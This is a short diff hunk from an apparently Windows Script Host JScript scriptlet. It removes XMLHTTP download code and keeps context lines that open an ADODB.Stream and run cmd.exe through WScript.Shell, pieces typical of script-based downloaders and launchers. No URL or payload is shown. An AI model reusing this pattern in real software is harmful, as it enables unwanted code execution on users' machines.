@@ -15,19 +15,7 @@
   var objArgs=WScript.Arguments; 
   var sGet=new ActiveXObject("ADODB.Stream"); 
   var xGet=null; 
-  try{ 
-  xGet=new XMLHttpRequest(); 
-  }catch(e){ 
-  try{ 
-  xGet=new ActiveXObject("Msxml2.XMLHTTP"); 
-  }catch(ex){ 
-  try{ 
-  xGet=new ActiveXObject("Microsoft.XMLHTTP"); 
-  }catch(e3){ 
-  xGet=null; 
-  } 
-  } 
-  } 
+ 
   var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
 ]]>
 </script>
